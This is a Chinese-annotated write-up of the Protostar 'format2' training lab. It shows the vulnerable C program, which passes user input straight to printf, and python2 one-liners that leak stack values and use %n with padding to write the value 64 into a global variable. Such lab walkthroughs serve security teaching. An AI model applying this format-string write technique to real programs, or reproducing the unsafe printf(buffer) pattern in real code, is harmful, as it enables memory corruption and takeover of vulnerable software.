```
# Format Two

This level moves on from format1 and shows how specific values can be written in memory.

This level is at /opt/protostar/bin/format2
```
---
```c
#include <stdlib.h>
#include <unistd.h>
#include <stdio.h>
#include <string.h>

int target;

void vuln()
{
  char buffer[512];

  fgets(buffer, sizeof(buffer), stdin); //使用`fgets(buffer, sizeof(buffer), stdin)`从键盘或重定向的文件读取输入，最多读取512字节
  printf(buffer);
  
  if(target == 64) {
      printf("you have modified the target :)\n");
  } else {
      printf("target is %d :(\n", target);
  }
}

int main(int argc, char **argv)
{
  vuln();
}
```
---

**本题目相较于format1区别如下：**
```c
1. **输入方式不同**：本题通过 `stdin` 使用 `fgets` 读取输入（最大 512 字节），而前一题通过命令行参数 `argv[1]` 接收输入。
2. **成功条件更严格**：本题要求全局变量 `target` 必须被精确修改为 **64** 才算成功；而前一题只需将其修改为任意非零值即可。
```

---

**找到terget的地址： 0x080496e4**
```c
└─$ objdump -t format2|grep target
080496e4 g     O .bss   00000004              target
```

**尝试确定输入的字符串在栈中的位置**
```c
python2 -c "print 'AAAA' + '%08x.'*10 + '[%08x]'" | ./format2
```
![image.png](https://raw.gitmirror.com/DarkLord-W/CloudImages/main/images/20250915195855544.png)

**减少`%08x.`的数量：**
![image.png](https://raw.gitmirror.com/DarkLord-W/CloudImages/main/images/20250915200029758.png)

**将字符串替换为target的地址**
```c
python2 -c "print '\xe4\x96\x04\x08' + '%08x.'*3 + '[%08n]'" | ./format2
�00000200.f7f965c0.00000000.[]
target is 32 :(
```
![image.png](https://raw.gitmirror.com/DarkLord-W/CloudImages/main/images/20250915200524428.png)

**添加`%<num>c` 用于填充长度：**
```c
python2 -c "print '\xe4\x96\x04\x08' + '%60c' + '%4\$n'" | ./format2

# `%4$n` → 把“到目前为止输出的字符数”写入栈上第 4 个参数指向的地址
#- 第 1 个参数：格式化字符串本身
#- 第 2、3、4 个参数：栈上后续内容，第 4 个正好是我们放的地址（需要调试确认偏移，这里假设是 4）
```

![image.png](https://raw.gitmirror.com/DarkLord-W/CloudImages/main/images/20250915200938613.png)
